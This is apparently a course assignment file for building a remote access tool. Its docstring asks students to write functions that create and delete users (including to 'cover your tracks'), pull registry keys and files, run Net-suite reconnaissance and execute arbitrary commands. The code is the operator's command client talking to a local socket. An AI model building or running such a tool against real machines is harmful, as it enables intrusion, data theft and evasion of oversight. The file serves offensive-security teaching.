'''
This project is something of a nod to the other course I taught. You'll
be writing a python script to gather information from a host machine and
send it to a target server. We'll be using a bit of the code from our
previous project, which I included in this file already.

HINT: We're gonna use the crap out of the subprocess module in this

Your functions are as follows:
    create_user
        given a name, create a user
    
    delete_user
        get rid of a user, cover your tracks, or just to upset the owner
    
    download_registry_key
        given a root and a key path, send the value to the client
    
    download_file
        given a specific file name (we're not going to do a full drive 
        search, since you already wrote that code in another project),
        download it to the client
    
    gather_information
        - using Ipconfig and Netstat, learn what addresses this machine 
          owns, and what connections it has active
        - using the Net suite, gather the various pieces of intel 
          covered in previous courses, specifically:
			Accounts (Password and account policy data)
			File (Indicates shared files or folders which are in use)
			localgroup(list of groups on a machine)
			session(Display information about sessions on a machine)
			share (lists all shares from the machine)
			user (lists users)
			view (list known computers in the domain)
        
    execute_command
        execute an arbitrary command and send the results back to the 
        client
'''
import socket, struct
from ctypes import *

def recv_data(sock):
    data_len, = struct.unpack("!I",sock.recv(4))
    return sock.recv(data_len)
    
def send_data(sock,data):
    data_len = len(data)
    sock.send(struct.pack("!I",data_len))
    sock.send(data)
    return
    
def main():
    command_list = ["CU" , "DU" , "DRK", "DF" , "GI" , "EC" ]
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 12345))
    while True:
        print "COMMANDS:"
        print "CU - Create User"
        print "DU - Delete User"
        print "DRK - Download Registry Key"
        print "DF - Download File"
        print "GI - Gather Information"
        print "EC - Execute Command"
        
        cmd = raw_input(recv_data(s))
        
        if cmd == "CU":
            send_data(s,cmd)
            send_data(s,raw_input(recv_data(s)))
            send_data(s,raw_input(recv_data(s)))
                    
        elif cmd == "DU":
            send_data(s,cmd)
            send_data(s,raw_input(recv_data(s)))
            
        elif cmd == "DRK":
            send_data(s,cmd)
            send_data(s,raw_input(recv_data(s)))
            send_data(s,raw_input(recv_data(s)))
            
            data = recv_data(s)
            while data != "DATA_COMPLETE":
                print data
                data = recv_data(s)
                
        elif cmd == "DF":
            send_data(s,cmd)
            print recv_data(s)
            send_data(s,raw_input())
            print recv_data(s)
            
        elif cmd == "GI":
            send_data(s,cmd)
            send_data(s,raw_input(recv_data(s)))
            print recv_data(s)
            
        elif cmd == "EC":
            send_data(s,cmd)
            print recv_data(s)
            send_data(s,raw_input())
            print recv_data(s)
            send_data(s,raw_input())
        
        else:
            print "INVALID"
    
        
    
main()
    
